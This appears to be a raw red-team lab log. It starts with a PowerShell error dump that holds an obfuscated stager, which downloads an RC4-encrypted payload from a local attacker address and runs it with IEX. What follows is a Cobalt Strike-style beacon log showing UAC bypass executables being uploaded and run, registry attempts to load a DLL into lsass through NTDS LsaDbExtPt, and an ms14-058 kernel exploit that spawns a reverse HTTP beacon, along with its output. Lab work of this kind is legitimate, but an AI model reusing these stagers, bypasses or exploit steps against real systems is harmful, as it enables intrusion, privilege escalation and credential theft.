S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

01/27 10:25:43 [task] 4************mshta测试*************
01/27 10:25:43 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:25:43 [task] cd c:\RedTeam\
01/27 10:25:43 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\test.doc as test.doc
01/27 10:25:43 [indicator] file: c72788bf68b43645d484bac297d20928 8586 bytes test.doc
01/27 10:25:43 [task] cd c:\RedTeam\
01/27 10:25:43 [task] Tasked beacon to run: test.doc
01/27 10:26:21 [checkin] host called home, sent: 8702 bytes
01/27 10:29:00 [task] 4*************LSA Disver************
01/27 10:29:00 [task] 获取管理员权限
01/27 10:29:00 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:29:00 [task] cd c:\RedTeam\
01/27 10:29:01 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:29:01 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:29:01 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:29:01 [task] 执行代码
01/27 10:29:07 [task] 4************白名单绕过*************
01/27 10:29:31 [checkin] host called home, sent: 160773 bytes
01/27 10:29:41 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:29:41 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:33:02 [task] 4************白名单绕过*************
01/27 10:33:41 [checkin] host called home, sent: 78 bytes
01/27 10:37:41 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
01/27 10:37:41 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:37:41 [task] cd c:\RedTeam\
01/27 10:37:42 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:37:42 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:37:42 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:37:51 [checkin] host called home, sent: 160369 bytes
01/27 10:39:58 [task] 4*************进行vmi启动**********
01/27 10:39:58 [task] 获取管理员权限
01/27 10:39:58 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:39:58 [task] cd c:\RedTeam\
01/27 10:39:58 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:39:58 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:39:58 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:39:58 [task] 执行代码
01/27 10:40:51 [checkin] host called home, sent: 161042 bytes
01/27 10:40:52 [output]
received output:
ERROR:
Description = Access denied


01/27 10:40:52 [output]
received output:
ERROR:
Description = Access denied


01/27 10:40:52 [output]
received output:
ERROR:
Description = Access denied


01/27 10:43:38 [input] <neo> elevate ms14-058 test
01/27 10:43:38 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
01/27 10:43:52 [checkin] host called home, sent: 104503 bytes
01/27 10:43:53 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c15000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F681FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6B9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C060CC30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


01/27 10:54:01 [task] 4************白名单绕过*************
01/27 10:54:53 [checkin] host called home, sent: 78 bytes
01/27 10:57:04 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3964; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:57:22 [input] <neo> elevate ms14-058 test
01/27 10:57:22 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
01/27 10:58:03 [checkin] host called home, sent: 104503 bytes
01/27 10:58:04 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c15000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F681FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6B9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C0642C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


01/27 11:16:34 [task] 4************白名单绕过*************
01/27 11:24:01 [task] 4************白名单绕过*************
01/27 14:11:32 [input] <neo> elevate ms14-058 test
01/27 14:11:32 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
